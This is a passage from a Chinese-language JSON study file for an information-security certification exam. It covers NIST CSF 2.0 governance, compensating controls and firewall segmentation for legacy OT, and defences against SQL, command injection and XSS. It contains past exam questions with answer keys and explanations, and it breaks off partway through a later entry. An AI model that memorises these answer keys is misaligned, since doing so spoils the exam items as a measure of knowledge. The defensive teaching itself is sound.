    "CSF 1.1 → 2.0 最明顯的改變：新增 Govern 為第六個功能；不是「新增」前五個功能（它們原本就有）。",
    "Govern 的重點：高層責任與決策角色，以及把網路安全融入組織整體風險管理；不是技術細節或自動化工具。",
    "問「非優先的合規標準」→ 先看標準的適用對象：被稽核的企業自己要遵循的，還是給驗證機構用的；ISO/IEC 27006 是後者。",
    "CSF 參考的 IT／OT 標準包含 ISO/IEC 27001、ISA 62443 系列；OT 相關的 NIST 指引是 SP 800-82，不要和別本 SP 800 混淆。"
   ],
   "trap": "以為 CSF 2.0 是「新增五大功能」（其實前五個本來就有，新增的是 Govern），或把 ISO/IEC 27006（給驗證機構）當成企業自己導入 AI 時要遵循的標準。",
   "quiz": [
    {
     "stem": "情境如附圖所示。因應AI 技術的成熟和普及，W公司已安排乙供應商擇一條產線進行新的AOI（Automated Optical Inspection）自動光學檢測系統評估，用以提升未來產線的QA 能力，請問在導入AI 技術時，下列何項為「非」優先考量的 AI 或資安治理合規標準？",
     "options": [
      "行政院數位發展部「公部門人工智慧應用參考手冊（草案）」",
      "EU AI Act歐盟AI 法案",
      "ISO/IEC 27006 資訊安全管理系統稽核規範",
      "IEC 62443系列工業通信網路-網路和系統的IT安全性標準"
     ],
     "answer": 2,
     "context": "W 公司是一家 ODM 公司，製造電子產品供應全球，因應下游客戶的要求，開始強化資訊安全防護與導入國際資安標準的合規認證；經與既有甲設備商確認產線上的 PLC 工控設備不能隨意更動，否則將會影響產線自動化功能與產品生產精確度和良率。\n圖 1（工廠網路示意圖）：Office LAN、MES 主機、AOI 主機與多條產線的 PLC 工控系統（其中一條含 AOI 檢測）皆連接至同一台交換器。\n圖 2　W 公司的工廠主機的弱點偵測掃瞄記錄摘要如下：\n192.168.3.2 (PLC#1)（欄位：Severity／CVSS／Name）\nCRITICAL　10.0　Unsupported Windows OS\nHIGH　7.5　Unsupported Web Server Detection\nHIGH　7.5　Microsoft Windows SMB Shares Unprivileged Access\nMEDIUM　6.8　Security Update for SAM and LSAD Remote Protocols\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\n192.168.3.3 (PLC#2)\nCRITICAL　10.0　Microsoft Windows SMBv1 Multiple Vulnerabilities\nCRITICAL　10.0　Unsupported Windows OS\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\nINFO　N/A　Windows Terminal Services Enabled\n192.168.1.102 (MES)\nHIGH　7.5　Unsupported Web Server Detection\nMEDIUM　6.5　Remote Desktop Protocol Server Man-in-the-Middle Weakness\nMEDIUM　6.4　SSL Certificate Cannot Be Trusted\nLOW　2.6　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\n192.168.1.211 (AOI)\nCRITICAL　10.0　Python Unsupported Version Detection\nCRITICAL　10.0　Microsoft SQL Server Unsupported Version Detection (remote check)\nHIGH　7.3　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\nMEDIUM　6.5　SSL Self-Signed Certificate\nMEDIUM　5.0　mDNS Detection (Remote Network)\nLOW　2.6　Terminal Services Encryption Level is not FIPS-140 Compliant\n圖 3（網路分割規劃示意圖）：維護廠商經 VPN 連入；中央為 Conduit 防火牆，分別連接 DMZ（OT DMZ，內有 MES、AOI）、各產線 PL1、PL2、PL3…PLn（每條產線各含 PLC 與生產設備）以及 IT（辦公室，內有電腦與 ERP）。n：代表產線號碼\n圖 4　Conduit Firewall 設定項目：\n甲. Deny All　　乙. Allow All\n丙. Allow IT to DMZ　　丁. Deny PLn to IT\n戊. Allow VPN to PLn　　己. Deny PLn to VPN\n庚. Allow IT to PLn　　辛. Deny PLn to DMZ\n壬. Allow PLm to IT　　癸. Deny PLn to PLm\n子. Allow DMZ to PLm　　丑. Deny DMZ to IT\n寅. Allow VPN to DMZ　　卯. Deny DMZ to VPN\nn 或 m：代表產線號碼",
     "hint": "逐項回想每份標準或規範的適用對象與主題，判斷它與題幹導入 AI 檢測系統的關係。",
     "explanation": "答案 C。W 公司要導入 AI 的 AOI 自動光學檢測系統，AI 與資安治理的合規標準首重 AI 專屬規範與工控安全：A 公部門人工智慧應用參考手冊（草案）與 B 歐盟 AI 法案是 AI 應用的治理與法規；D IEC 62443 針對產線的工控網路與系統安全，W 公司廠區有 PLC 與產線，是相關標準。C ISO/IEC 27006 是對 ISMS 驗證機構的稽核與驗證要求，規範對象是驗證機構，不是導入 AI 的公司，所以不是優先考量。",
     "source": "115-1 第17題"
    },
    {
     "stem": "下列哪一種資訊安全框架特別強調治理（Govern）、識別（Identify）、保護（Protect）、偵測（Detect）、回應（Respond）與復原（Recover）六大面向？",
     "options": [
      "ISO 27001",
      "CIS CSC",
      "NIST Cybersecurity Framework v2（CSF）",
      "Zero Trust"
     ],
     "answer": 2,
     "hint": "逐項回想每個框架的組成結構，判斷哪一個包含題目列出的六大面向。",
     "explanation": "答案 C。NIST Cybersecurity Framework 2.0 的六大功能為 Govern、Identify、Protect、Detect、Respond、Recover，正好是題幹列的六項。A ISO 27001 以 ISMS 條款與附錄控制項為主；B CIS CSC 是控制項清單（CIS Controls）；D Zero Trust 是架構原則，都不是這六項功能。",
     "source": "114-2 第9題"
    },
    {
     "stem": "下列何項正確的描述了美國國家標準技術研究院（NIST）的網路安全框架（Cyber Security Framework, CSF）新增的「治理（Govern）」功能重點？",
     "options": [
      "明確高層管理在網路安全策略中的責任與決策角色",
      "提供技術層面的具體指導來實施威脅緩解機制",
      "強調將網路安全融入組織的整體風險管理框架中",
      "引入自動化工具以簡化網路安全事件的回應流程"
     ],
     "answer": [
      0,
      2
     ],
     "hint": "回想 CSF 2.0 對 Govern 功能的定義與其類別，逐項比對。",
     "explanation": "答案 A、C。CSF 2.0 新增的 Govern 功能，重點是明確高層管理在網路安全策略中的責任與決策角色，以及把網路安全融入組織整體風險管理。B 提供技術層面的具體指導不是 Govern 的重點，它屬於 Protect 等功能；D 引入自動化工具簡化事件回應與治理無關，偏向 Respond 領域。",
     "source": "114-2 第15題"
    },
    {
     "stem": "下列何項是美國國家標準技術研究院（NIST）的網路安全框架（Cyber Security Framework，CSF）從版本 1.1 更新到 2.0 中最明顯的改變？",
     "options": [
      "增加了新的五大功能類別，分別為辨識（Identify）、保護（Protect）、偵測（Detect）、回應（Respond）、復原（Recover）",
      "引入「治理（Govern）」作為第六個核心功能",
      "簡化了所有類別的定義以提升易用性",
      "擴展了對雲端安全的具體指導內容"
     ],
     "answer": 1,
     "hint": "v1.1 本來就有幾個功能？先回想舊版有哪些，再看新版「多出」的是什麼。",
     "explanation": "答案 B。CSF 從 1.1 升到 2.0 最明顯的改變，是新增「治理（Govern）」作為第六個核心功能。A 說「新增」辨識、保護、偵測、回應、復原五大功能是錯的，這五個功能 1.1 版就有了；C、D 雖然 2.0 在易用性與涵蓋範圍（包括供應鏈等）有調整，但不是最明顯的改變。",
     "source": "114-1 第14題"
    },
    {
     "stem": "有關 NIST 網路安全框架（Cybersecurity Framework，CSF）所參考適用於 IT 與 OT 環境之國際標準或指引。下列敘述何者錯誤？",
     "options": [
      "ISO/IEC 27001：2013",
      "ISA 62443-2-1：2009",
      "NIST SP 800-72",
      "ISA 62443-3-3：2013"
     ],
     "answer": 2,
     "hint": "回想 NIST CSF 引用的 IT／OT 參考文件，逐項判斷每份文件的主題是否相符。",
     "explanation": "答案 C。CSF 對照的 IT／OT 參考標準包含 ISO/IEC 27001（A）與 ISA 62443-2-1（B）、ISA 62443-3-3（D），題目要找的是錯誤的敘述；與 OT（工業控制系統）相關的 NIST 指引是 SP 800-82，而不是 SP 800-72，因此 C 錯誤。",
     "source": "113-2 第8題"
    }
   ]
  },
  {
   "id": "1.2-06",
   "section": "1.2",
   "title": "OT 補償控制與區域分段",
   "examHits": 14,
   "examRefs": [
    "115-2 第16題",
    "115-2 第28題",
    "115-1 第18題",
    "115-1 第20題",
    "114-2 第12題",
    "114-1 第24題",
    "113-1 第15題",
    "113-1 第16題",
    "113-1 第17題",
    "113-1 第37題",
    "113-1 第38題",
    "113-1 第40題",
    "111-1 第22題",
    "111-1 第24題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "OT（工控）環境的難處是：舊系統（Legacy OS）不能隨便更新，產線也不能停。所以重點是「補償性控制」：不動設備本身，把保護放在外面。做法有依 Purdue 模型與 IEC 62443 做網路分段並設工業 DMZ、用 Conduit 防火牆控制區域之間的流量、控管 USB 與可攜式媒體、部署被動式 OT 網路探針監控異常指令、用資料二極體讓資料單向流出，以及對無法修補的設備做虛擬修補（用 IPS／WAF 之類擋住攻擊特徵）。防火牆規則要由上往下比對、預設拒絕放最後；Allow All 放最前面或最後都會讓整個政策失效。遇到 Modbus 之類的異常寫入，用 IPS 做協定深度解析、把寫入設為只讀或阻斷，影響最小。",
   "keyPoints": [
    "看到「舊 OT 設備不能更新」→ 用補償性控制：分段（Purdue、工業 DMZ）、USB 管控、被動式 OT 探針、虛擬修補；別叫它直接連網遠端更新。",
    "看到「純技術維運範疇」→ 資料二極體、Port Isolation／Sticky MAC、工控協定 DPI 屬技術控制；修改手冊與簽署聲明屬管理措施。",
    "防火牆政策選項題：規則由上往下，預設拒絕（Deny All）應放最後；Allow All 擺在前面或結尾都會讓管制失效。",
    "對 OT 異常寫入封包 → 用 IPS 協定深度解析並阻斷該行為，是「最小影響但高效遏制」；全面斷線或全數更新韌體衝擊太大。",
    "弱點掃描結果要對照標的：產線上不能動的 PLC 用虛擬補丁保護；新導入的系統（如 AOI）可以直接修補；與產線無關的工作站不是這次的重點。"
   ],
   "trap": "看到弱點就想「馬上更新」，忽略 OT 設備不能動；或只看規則內容，沒注意防火牆規則的順序與預設拒絕的位置。",
   "quiz": [
    {
     "stem": "在製造業場域中，OT環境常存有無法更新修補程式的舊系統（Legacy OS）。在不影響生產線運作的前提下，下列哪些補償性控制措施（Compensating Controls）是適當的？",
     "options": [
      "依據普渡模型（Purdue Model）進行網路分段，設立工業DMZ",
      "限制OT網路內的USB 儲存裝置存取，並設置檢查站",
      "強制將所有PLC 與HMI直接連網，以便遠端更新與維護",
      "部署被動式OT網路探針，監控異常指令與通訊行為"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "hint": "逐項問：這項措施能不能在不修改舊系統、不影響生產的前提下降低風險？",
     "explanation": "答案 A、B、D。舊系統無法修補時，要靠補償性控制降低風險：A 依 Purdue 模型網路分段並設工業 DMZ，縮小攻擊面；B 限制 USB 儲存裝置存取並設置檢查站，擋掉媒體帶入的威脅；D 被動式 OT 網路探針只監聽、不干擾生產，能發現異常指令與通訊行為。C 強制讓 PLC 與 HMI 直接連網，只會讓不能修補的舊設備更暴露，與補償性控制相反。",
     "source": "115-2 第16題"
    },
    {
     "stem": "情境如附圖所示。針對深度防禦與隔離技術，為了徹底解決IT/OT整合後的邊界安全問題，防止類似的「隱蔽通道（Covert Channel）」再次出現，維運團隊決定在Level 3（製造運營層）與Level 4（企業辦公層）之間網路強化防護。下列哪些技術方法屬於純技術維運範疇且能有效降低風險？",
     "options": [
      "部署數據閘道器（Data Diode / One-way Gateway），確保數據只能從OT端單向流向IT端",
      "在交換器上啟動「Port Isolation」與「Sticky MAC」，限制未授權設備接入",
      "修改公司資安手冊，增加「嚴禁使用私人USB」之條文並要求員工簽署聲明",
      "實施深度封包檢測（DPI），解析工控協定（如 S7Comm, EtherNet/IP）的酬載（Payload），監控非白名單內的Function Code"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "這是一份針對高度機密工廠環境（OT/ICS 與 IT 整合）的技術考題。場景設定在一個半導體晶圓廠的自動化生產線，重點在於網路隔離失效後的應變與威脅狩獵。\n\n考場情境設定：自動化工廠的「影子連線」（Shadow Connection）\n背景：某台灣知名半導體廠的生產執行系統（Manufacturing Execution System，MES），該系統屬於重要製造營運層（Purdue Level 3）。該廠區嚴格執行網段隔離（Network Segmentation），但最近資安監控中心（Security Operations Center，SOC）在防火牆日誌中發現，一部位於「工控機台控制段（Level 2）」的可程式邏輯控制器（PLC）管理工作站，竟然試圖透過非典型的連接埠連向外部不知名的 IP 位址。",
     "hint": "逐項檢查題目的兩個條件：是否屬於純技術維運？能否降低 Level 3 與 Level 4 之間的邊界風險？",
     "explanation": "答案 A、B、D。題目要求「純技術維運範疇」且能降低 Level 3 與 Level 4 之間的邊界風險：A 資料二極體讓資料只能從 OT 單向流向 IT；B 交換器啟用 Port Isolation 與 Sticky MAC，限制未授權設備接入；D 對 S7Comm、EtherNet/IP 等工控協定做深度封包檢測，監控非白名單的 Function Code。C 修改手冊並簽署聲明屬管理措施，不是純技術維運，也不能技術性阻止隱蔽通道，所以不選。",
     "source": "115-2 第28題"
    },
    {
     "stem": "情境如附圖所示。圖2為 W公司在工廠內進行的主機弱點偵測掃瞄記錄，請問 W公司在提升工廠生產線的資安作為，下列何項資安維護作業較「不」合適？",
     "options": [
      "修補計劃導入的AOI 系統源碼掃瞄的高風險項目",
      "更新非產線的 Windows 作業系統工作站至最新發布的版本",
      "規劃虛擬補丁（Virtual Patching）機制，保護實體防護不足與無法更新修補的設備與工控系統",
      "修補AOI 主機系統的弱點掃瞄和滲透測試的高風險項目"
     ],
     "answer": 1,
     "context": "W 公司是一家 ODM 公司，製造電子產品供應全球，因應下游客戶的要求，開始強化資訊安全防護與導入國際資安標準的合規認證；經與既有甲設備商確認產線上的 PLC 工控設備不能隨意更動，否則將會影響產線自動化功能與產品生產精確度和良率。\n圖 1（工廠網路示意圖）：Office LAN、MES 主機、AOI 主機與多條產線的 PLC 工控系統（其中一條含 AOI 檢測）皆連接至同一台交換器。\n圖 2　W 公司的工廠主機的弱點偵測掃瞄記錄摘要如下：\n192.168.3.2 (PLC#1)（欄位：Severity／CVSS／Name）\nCRITICAL　10.0　Unsupported Windows OS\nHIGH　7.5　Unsupported Web Server Detection\nHIGH　7.5　Microsoft Windows SMB Shares Unprivileged Access\nMEDIUM　6.8　Security Update for SAM and LSAD Remote Protocols\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\n192.168.3.3 (PLC#2)\nCRITICAL　10.0　Microsoft Windows SMBv1 Multiple Vulnerabilities\nCRITICAL　10.0　Unsupported Windows OS\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\nINFO　N/A　Windows Terminal Services Enabled\n192.168.1.102 (MES)\nHIGH　7.5　Unsupported Web Server Detection\nMEDIUM　6.5　Remote Desktop Protocol Server Man-in-the-Middle Weakness\nMEDIUM　6.4　SSL Certificate Cannot Be Trusted\nLOW　2.6　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\n192.168.1.211 (AOI)\nCRITICAL　10.0　Python Unsupported Version Detection\nCRITICAL　10.0　Microsoft SQL Server Unsupported Version Detection (remote check)\nHIGH　7.3　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\nMEDIUM　6.5　SSL Self-Signed Certificate\nMEDIUM　5.0　mDNS Detection (Remote Network)\nLOW　2.6　Terminal Services Encryption Level is not FIPS-140 Compliant\n圖 3（網路分割規劃示意圖）：維護廠商經 VPN 連入；中央為 Conduit 防火牆，分別連接 DMZ（OT DMZ，內有 MES、AOI）、各產線 PL1、PL2、PL3…PLn（每條產線各含 PLC 與生產設備）以及 IT（辦公室，內有電腦與 ERP）。n：代表產線號碼\n圖 4　Conduit Firewall 設定項目：\n甲. Deny All　　乙. Allow All\n丙. Allow IT to DMZ　　丁. Deny PLn to IT\n戊. Allow VPN to PLn　　己. Deny PLn to VPN\n庚. Allow IT to PLn　　辛. Deny PLn to DMZ\n壬. Allow PLm to IT　　癸. Deny PLn to PLm\n子. Allow DMZ to PLm　　丑. Deny DMZ to IT\n寅. Allow VPN to DMZ　　卯. Deny DMZ to VPN\nn 或 m：代表產線號碼",
     "hint": "對照圖 2 的掃描結果與題目要提升的範圍，逐項判斷每項作業的處理對象與必要性。",
     "explanation": "答案 B。圖 2 的弱點掃描對象是產線上的 PLC#1、PLC#2、MES 與 AOI 主機，題目問「提升工廠生產線資安」較不合適的作業。A、D 修補 AOI 系統的高風險項目（AOI 是正在評估導入的新系統，可以修補）；C 對不能更新的 PLC 與工控系統做虛擬補丁，正是 OT 常用的補償性做法。B 更新的是非產線的 Windows 工作站，與掃描結果列出的產線主機無關，對提升產線資安的作用最小，所以最不合適。",
     "source": "115-1 第18題"
    },
    {
     "stem": "情境如附圖所示。W 公司計劃將工廠的網路分割為不同區域，分別獨立出個別產線單元，並將主機設備集中到OT DMZ 網段之中，在不提供工控系統連接外部網路的狀況下，可於必要時啟用 VPN 帳號，使維護廠商得以用 VPN 進行連線作業，圖 3 網路分割區塊規劃，請依圖 4 中的路由管理項目，本場域的 IEC 62443 Conduit 防火牆，下列何者為較佳的防火牆政策設定？",
     "options": [
      "癸丁己辛丑乙",
      "乙己辛癸丑卯",
      "甲壬子寅丙",
      "丙寅子戊甲"
     ],
     "answer": 3,
     "context": "W 公司是一家 ODM 公司，製造電子產品供應全球，因應下游客戶的要求，開始強化資訊安全防護與導入國際資安標準的合規認證；經與既有甲設備商確認產線上的 PLC 工控設備不能隨意更動，否則將會影響產線自動化功能與產品生產精確度和良率。\n圖 1（工廠網路示意圖）：Office LAN、MES 主機、AOI 主機與多條產線的 PLC 工控系統（其中一條含 AOI 檢測）皆連接至同一台交換器。\n圖 2　W 公司的工廠主機的弱點偵測掃瞄記錄摘要如下：\n192.168.3.2 (PLC#1)（欄位：Severity／CVSS／Name）\nCRITICAL　10.0　Unsupported Windows OS\nHIGH　7.5　Unsupported Web Server Detection\nHIGH　7.5　Microsoft Windows SMB Shares Unprivileged Access\nMEDIUM　6.8　Security Update for SAM and LSAD Remote Protocols\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\n192.168.3.3 (PLC#2)\nCRITICAL　10.0　Microsoft Windows SMBv1 Multiple Vulnerabilities\nCRITICAL　10.0　Unsupported Windows OS\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\nINFO　N/A　Windows Terminal Services Enabled\n192.168.1.102 (MES)\nHIGH　7.5　Unsupported Web Server Detection\nMEDIUM　6.5　Remote Desktop Protocol Server Man-in-the-Middle Weakness\nMEDIUM　6.4　SSL Certificate Cannot Be Trusted\nLOW　2.6　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\n192.168.1.211 (AOI)\nCRITICAL　10.0　Python Unsupported Version Detection\nCRITICAL　10.0　Microsoft SQL Server Unsupported Version Detection (remote check)\nHIGH　7.3　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\nMEDIUM　6.5　SSL Self-Signed Certificate\nMEDIUM　5.0　mDNS Detection (Remote Network)\nLOW　2.6　Terminal Services Encryption Level is not FIPS-140 Compliant\n圖 3（網路分割規劃示意圖）：維護廠商經 VPN 連入；中央為 Conduit 防火牆，分別連接 DMZ（OT DMZ，內有 MES、AOI）、各產線 PL1、PL2、PL3…PLn（每條產線各含 PLC 與生產設備）以及 IT（辦公室，內有電腦與 ERP）。n：代表產線號碼\n圖 4　Conduit Firewall 設定項目：\n甲. Deny All　　乙. Allow All\n丙. Allow IT to DMZ　　丁. Deny PLn to IT\n戊. Allow VPN to PLn　　己. Deny PLn to VPN\n庚. Allow IT to PLn　　辛. Deny PLn to DMZ\n壬. Allow PLm to IT　　癸. Deny PLn to PLm\n子. Allow DMZ to PLm　　丑. Deny DMZ to IT\n寅. Allow VPN to DMZ　　卯. Deny DMZ to VPN\nn 或 m：代表產線號碼",
     "hint": "回想防火牆規則的比對順序，以及「預設拒絕」應擺在清單的哪個位置，再用這個原則檢查四組。",
     "explanation": "答案 D。依圖 3 的規劃：IT、DMZ、VPN 與各產線透過 Conduit 防火牆互連，必要時啟用 VPN 讓維護廠商連線。防火牆規則要由上往下比對，並以 Deny All 作為預設放在最後。D（丙、寅、子、戊、甲）先放行 IT 到 DMZ、VPN 到 DMZ、DMZ 到產線、VPN 到產線，最後以 Deny All 收尾，符合「明列放行、其餘拒絕」。A、B 含 Allow All（乙），A 把它放最後會放行所有未列流量、B 放最前面則其後規則全部失效；C 把 Deny All（甲）放第一條，後面的放行規則永遠不會被比對到。（照官方答案 D；戊讓 VPN 可直通產線，和圖 3 較理想的「VPN 只到 DMZ」不完全一致，官方未說明理由。）",
     "source": "115-1 第20題"
    },
    {
     "stem": "依據 SANS 工業控制系統殺戮鏈（SANS Industrial Control System Kill Chain），若在營運技術網路（Operational Technology, OT）偵測到大量 Modbus 功能碼 0x10（Write Multiple Registers）的非預期封包，下列何種即時防禦措施最符合「最小影響但高效遏制」原則？",
     "options": [
      "於核心路由器啟用 Geofencing 阻斷來源 IP",
      "立即更新所有 PLC 韌體",
      "立刻切斷工控網與 IT 網的所有連線",
      "於入侵防禦系統（IPS）套用 Modbus 深度解析規則，並將 Write 多筆暫存器行為設為只讀或阻斷"
     ],
     "answer": 3,
     "hint": "逐項檢查題目的兩個條件：對生產的影響有多大？遏制效果有多好？",
     "explanation": "答案 D。Modbus 功能碼 0x10 是「寫入多個暫存器」，在 OT 網路中出現大量非預期的寫入封包，風險是可能直接改動控制設備。D 在 IPS 套用 Modbus 深度解析規則，把寫入多筆暫存器的行為設為只讀或阻斷，只針對異常行為，對正常的讀取通訊影響最小，符合「最小影響但高效遏制」。A 地理封鎖（Geofencing）對內部或境內來源無效；B 立即更新所有 PLC 韌體需要停機與測試，衝擊大；C 切斷工控網與 IT 網的所有連線，影響過大。",
     "source": "114-2 第12題"
    }
   ]
  },
  {
   "id": "1.2-07",
   "section": "1.2",
   "title": "注入與 XSS 防護手法",
   "examHits": 12,
   "examRefs": [
    "115-1 第39題",
    "114-2 第1題",
    "114-2 第4題",
    "114-1 第3題",
    "112-2 第35題",
    "112-1 第1題",
    "111-1 第2題",
    "111-1 第14題",
    "110-1 第7題",
    "109-1 第4題",
    "109-1 第13題",
    "108-1 第9題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "注入與 XSS 的共同根因是「使用者輸入被當成指令或程式碼」。根治的做法是改變輸入被處理的方式：SQL 注入用參數化查詢（Prepared Statement），讓輸入永遠只是資料；XSS 在輸出時做輸出編碼，並以 CSP 限制腳本來源；命令注入避免組合系統指令，或用允許清單（白名單）限制可用的命令與參數。輸入過濾、黑名單、限制長度、前端 JavaScript 檢查都只是輔助，容易被繞過。最小權限與關閉詳細錯誤訊息則是降低災情與資訊洩漏。另外防火牆擋流量治不了 RCE，DEP 屬於緩衝區溢位的緩解手段，防毒軟體也不是修補命令注入的方法。",
   "keyPoints": [
    "看到 SQL 注入 → 首選參數化查詢；輸入驗證與長度限制只是輔助，攻擊字串很短就能成功，所以限制長度最不能阻止注入。",
    "看到 XSS → 輸出編碼加 CSP；看到命令注入 → 允許清單（白名單）與避免拼接系統指令。",
    "黑名單、只做字串過濾、只用防火牆封鎖流量，都是「容易被繞過」的做法，通常是錯誤或效果最差的選項。",
    "前端（瀏覽器）的 JavaScript 檢查攻擊者可以略過，直接送請求到伺服器，不能作為安全防線。",
    "緩衝區溢位的緩解是 DEP／ASLR 這類記憶體防護；根治是修正程式碼；HTTP 改用 HTTPS 保護傳輸，不處理注入。"
   ],
   "trap": "把「過濾特殊字元」「限制長度」「前端檢查」當成根治手段；真正改變輸入如何被處理的是參數化查詢、輸出編碼與白名單。",
   "quiz": [
    {
     "stem": "情境如附圖所示。防範 SQL注入弱點時，下列哪一個觀念最「不」適切，最難有效阻止 SQL注入？",
     "options": [
      "使用參數化查詢（Prepared Statements）",
      "使用正則表示式（Regular Expression）過濾輸入值，限制輸入字元的內容",
      "限制參數的輸入字元長度，將長度控制在 50 個字元以內",
      "採用最小權限原則，並且關閉錯誤訊息，減少攻擊者可獲得的權限和資訊"
     ],
     "answer": 2,
     "context": "某銀行委託資安團隊對新版線上金融交易系統執行資安檢測，包含滲透測試、原始碼檢測及整體資安健診。在滲透測試過程中，資安團隊成功繞過前端 WAF，發現系統可透過交易金額欄位進行 SQL 注入（SQL Injection）。在原始碼檢測時，資安團隊發現開發人員未使用參數化查詢（Parameterized Query），而直接拼接字串。",
     "hint": "回想 SQL 注入的成因，逐項判斷每個觀念能否從成因上阻止注入。",
     "explanation": "答案 C。限制輸入長度在 50 個字元以內，攻擊字串（例如在金額欄位加上一小段恆真條件）很短就能成功，長度限制不改變輸入會被當成 SQL 的本質，最難有效阻止注入。A 參數化查詢是根本做法；B 用正規表示式只接受合理字元（類似白名單）能擋掉多數注入字元，雖不是根治，仍有防禦價值；D 最小權限與關閉錯誤訊息，降低攻擊者可取得的權限與資訊。",
     "source": "115-1 第39題"
    },
    {
     "stem": "下列的弱點應對修補方式，何者最為適當？",
     "options": [
      "緩衝區溢位（Buffer Overflow）使用記憶體執行阻擋（Data Execution Prevention, DEP）",
      "遠端程式碼執行（RCE）僅以防火牆封鎖流量",
      "指令注入（Command Injection）只做字串過濾",
      "資源注入（Resource Injection）採黑名單過濾資源名稱"
     ],
     "answer": 0,
     "hint": "逐項回想每種弱點的成因，判斷搭配的修補方式能否處理該成因。",
     "explanation": "答案 A。緩衝區溢位可用資料執行防護（DEP）阻擋在資料區段執行程式碼，這是常見的緩解手段。B RCE 只靠防火牆封鎖流量不夠，攻擊常走合法開放的埠與協定；C 命令注入只做字串過濾容易被繞過，應避免拼接指令並使用白名單；D 資源注入採黑名單過濾容易被繞過，應以允許清單驗證。",
     "source": "114-2 第1題"
    },
    {
     "stem": "為了防範常見的網站應用程式攻擊，如 SQL 注入（SQL Injection）與跨網站指令碼（XSS），開發團隊在設計安全架構時，應實施下列哪些防護與應變技術最為適切？",
     "options": [
      "在伺服器端採用參數化查詢（Parameterized Queries）或預處理敘述（Prepared Statements）來處理所有資料庫操作",
      "在網頁前端實作嚴格的內容安全策略（Content Security Policy, CSP）以限制外部腳本的載入與執行",
      "對所有使用者輸入的資料，在輸出至網頁時進行適當的編碼（Output Encoding）",
      "僅在 HTTP 協定上運行網站，避免 HTTPS 加密造成的效能損耗"
     ],
     "answer": [
      0,
      1,
      2
     ],
     "hint": "先分別說出 SQL 注入與 XSS 的根因，再檢查每項措施是否直接處理其中之一。",
     "explanation": "答案 A、B、C。A 參數化查詢或預處理敘述，讓輸入只是資料，根治 SQL 注入；B 嚴格的內容安全策略（CSP）限制外部腳本載入與執行，降低 XSS 被利用的機會；C 輸出編碼避免輸入被當成網頁程式碼執行，是防 XSS 的核心做法。D 只在 HTTP 上運行網站，傳輸沒有加密，反而增加被竊聽與竄改的風險，也與防注入和 XSS 無關。",
     "source": "114-2 第4題"
    },
    {
     "stem": "當企業遇到資安攻擊時，可以思考各種不同的方式來進行防禦，以便修補漏洞或暫時緩解。開發人員或資安維運人員必須選擇最合適的防禦機制來修補資安漏洞。下列何種防禦手法的「效果最差」，很容易被攻擊者用其他方式繞過？",
     "options": [
      "Filter Input and Escape Output，也就是過濾使用者輸入的特殊字元，並且在後端輸出內容時將特殊字元進行轉化，避免發生 XSS 攻擊",
      "實作上傳功能時，檢查上傳檔案的內容與路徑，也限制上傳檔案的副檔名，並且將檔案搬移至上傳檔案專屬目錄，甚至是上傳到靜態檔案專屬的伺服器，同時也將該目錄設定為不可執行檔案，避免有網頁程式碼在該目錄被執行",
      "撰寫資料庫查詢功能時，無論參數是不是使用者所輸入的，都必須針對參數內容進行過濾，移除所有非必要的特殊字元，並且對無法移除的特殊字元進行轉化。同時建議使用 Prepared Statement 來撰寫資料庫查詢功能會較為安全",
      "在一個需要串接系統指令的網頁應用程式中，開發人員在網頁程式前端使用 JavaScript 來過濾特殊字元，防止攻擊者在參數中注入特殊字元來執行系統指令並達成 Command Injection 攻擊"
     ],
     "answer": 3,
     "hint": "逐項問：這個防禦手法有沒有可能被攻擊者避開？避開的難度高不高？",
     "explanation": "答案 D。命令注入要靠伺服器端驗證與避免拼接指令，在網頁前端用 JavaScript 過濾特殊字元，攻擊者可以略過瀏覽器，直接用工具把請求送到伺服器，所以這種防禦效果最差。A 過濾輸入並輸出時轉義，是防 XSS 的標準手法；B 上傳檔案檢查內容、限制副檔名並放在不可執行的目錄，是正確的做法；C 查詢參數過濾並使用 Prepared Statement 是防 SQL 注入的建議方式。",
     "source": "114-1 第3題"
    },
    {
     "stem": "情境如附圖所示。在檢測後發現命令注入弱點（Command Injection），請問應採用下列何項進行修復？",
     "options": [
      "過濾特殊字元及允許命令之白名單",
      "不允許大寫字元",
      "過濾 Unicode 字元",
      "使用防毒軟體"
     ],
     "answer": 0,
     "context": "【題組 4】\nA 企業推出長照媒合線上服務，其資訊架構包含 Web 及 mobile app 等，後端採用 MySQL 資料庫。其架構有切割出 API 伺服器及資料庫伺服器。",
     "hint": "回想命令注入的成因，逐項判斷每個做法能否阻止使用者輸入被當成指令執行。",
     "explanation": "答案 A。修補命令注入弱點，應過濾特殊字元並使用允許命令的白名單，讓只有預期的命令能被執行。B 不允許大寫字元，指令與參數仍可用小寫；C 只過濾 Unicode 字元針對性太窄，攻擊者可改用其他方式；D 防毒軟體不是修補應用程式邏輯弱點的方法。",
     "source": "112-2 第35題"
    }
   ]
  },
  {
   "id": "1.2-08",
   "section": "1.2",
   "title": "資安法通報與治理要求",
   "examHits": 10,
   "examRefs": [
    "114-1 第19題",
    "112-2 第20題",
    "112-1 第17題",
    "112-1 第22題",
    "111-1 第20題",
    "109-1 第36題",
    "108-1 第19題",
    "108-1 第34題",
    "108-1 第35題",
    "108-1 第36題"
   ],
   "guidePages": "",
   "inGuide": true,
